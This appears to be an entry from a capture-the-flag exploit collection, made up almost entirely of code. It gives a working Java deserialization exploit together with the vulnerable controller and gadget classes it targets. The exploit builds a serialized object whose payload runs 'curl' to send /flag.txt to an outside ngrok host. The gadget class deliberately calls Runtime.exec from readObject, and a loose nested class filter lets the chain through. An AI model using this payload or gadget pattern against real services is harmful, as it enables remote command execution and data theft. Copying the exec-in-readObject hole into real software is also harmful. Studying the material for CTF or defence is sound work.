# Example 1
## Exploit
```java
package com.securinets.services;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.concurrent.ConcurrentSkipListSet;

import com.securinets.utils.*;

public class Main {
    public static void main(String[] args) throws IOException, InterruptedException, ClassNotFoundException {
        String serializedAuthor = toB64(new Author("curl http://2.tcp.ngrok.io:14915 -d @/flag.txt"));
        QuestionCompar qc = new QuestionCompar(serializedAuthor);
        var a = new ConcurrentSkipListSet(qc);
        a.add("a");
        a.add("b");
        System.out.println(toB64(a));
    }

    public static String toB64(Object o) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
}
```

## Vulnerable code
```java
package com.securinets.controllers;

import com.securinets.entities.Question;
import com.securinets.services.QuestionService;
import com.securinets.services.Security;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class QuestionController {
   private QuestionService questionService;

   public void setQuestionService(QuestionService questionService) {
      this.questionService = questionService;
   }

   public String list(String latest_question) {
      if (latest_question.length() == 0) {
      } else {
         try {
            byte[] decodedBytes = Base64.getDecoder().decode(latest_question);
            ByteArrayInputStream ini = new ByteArrayInputStream(decodedBytes);
            Security inp = new Security(ini);
            Question result = null;
            result = (Question)inp.readObject();
         } catch (IllegalArgumentException var7) {
            var7.printStackTrace();
         } catch (IOException var8) {
            var8.printStackTrace();
         } catch (ClassNotFoundException var9) {
            var9.printStackTrace();
         }
      }

      return "questions";
   }
}
```

## Context
```java
package com.securinets.services;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Author implements Serializable {
   private static final long serialVersionUID = 1L;
   private String name;
   public int old;
   private String uuid;

   public Author(String cmd) {
      this.name = cmd;
      this.old = 0;
      this.uuid = "";
   }

   private void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException {
      ois.defaultReadObject();
      this.compute();
   }

   public int compute() {
      try {
         if (this.uuid.hashCode() == 0) {
            Runtime.getRuntime().exec(this.name);
            return 0;
         } else {
            return Integer.parseInt(this.uuid);
         }
      } catch (IOException var2) {
         var2.printStackTrace();
         return -1;
      }
   }
}
```

```java
package com.securinets.services;

import java.io.IOException;
import java.io.InputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.regex.Pattern;

public class LooseSecurity extends ObjectInputStream {
   public LooseSecurity(InputStream inputStream) throws IOException {
      super(inputStream);
   }

   protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
      if (!Pattern.matches("(com\\.securinets\\.(.*))|(java\\.(.*))|(java\\.time\\.(.*))", desc.getName())) {
         throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
      } else {
         return super.resolveClass(desc);
      }
   }
}
```

```java
package com.securinets.services;

import java.io.IOException;
import java.io.InputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.regex.Pattern;

public class Security extends ObjectInputStream {
   public Security(InputStream inputStream) throws IOException {
      super(inputStream);
   }

   protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
      if (!Pattern.matches("(java\\.(.*))|(com\\.securinets\\.utils\\.(.*))", desc.getName())) {
         throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
      } else {
         return super.resolveClass(desc);
      }
   }
}

```

```java
package com.securinets.utils;

import com.securinets.services.Author;
import com.securinets.services.LooseSecurity;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.Serializable;
import java.util.Base64;
import java.util.Comparator;

public class QuestionCompar implements Serializable, Comparator<Object> {
   private String internal;
   private static final long serialVersionUID = 1L;

   public QuestionCompar(String i) {
      this.internal = i;
   }

   public int compare(Object one, Object two) {
      return -1;
      // try {
      //    byte[] decodedBytes = Base64.getDecoder().decode(this.internal);
      //    ByteArrayInputStream ini = new ByteArrayInputStream(decodedBytes);
      //    LooseSecurity a = new LooseSecurity(ini);
      //    Author res = (Author)a.readObject();
      //    return res.old == 1 ? 1 : 0;
      // } catch (ClassNotFoundException | IOException var7) {
      //    var7.printStackTrace();
      //    return -1;
      // }
   }
}
```
